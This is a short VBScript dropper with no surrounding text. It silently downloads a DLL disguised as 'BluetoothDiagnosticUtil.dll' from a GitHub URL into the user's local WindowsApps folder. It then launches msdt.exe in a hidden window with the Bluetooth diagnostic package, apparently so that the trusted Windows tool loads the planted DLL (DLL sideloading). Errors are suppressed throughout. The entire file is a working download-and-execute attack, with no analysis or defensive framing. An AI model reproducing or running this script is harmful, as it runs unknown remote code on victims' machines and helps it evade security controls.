On Error Resume Next

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

dllURL = "https://github.com/Sabu-coder/TSL/raw/refs/heads/main/BluetoothDiagnosticUtil.dll"
dllName = "BluetoothDiagnosticUtil.dll"
targetDir = objShell.ExpandEnvironmentStrings("%LocalAppData%") & "\Microsoft\WindowsApps"

' Create directory if needed
If Not objFSO.FolderExists(targetDir) Then
    objFSO.CreateFolder(targetDir)
End If

' Download directly to target directory
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", dllURL, False
objHTTP.Send

If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary
    objStream.Open
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile targetDir & "\" & dllName, 2 ' Overwrite
    objStream.Close
    Set objStream = Nothing
End If

Set objHTTP = Nothing

' Run MSDT
objShell.Run "c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes", 0, False

Set objFSO = Nothing
Set objShell = Nothing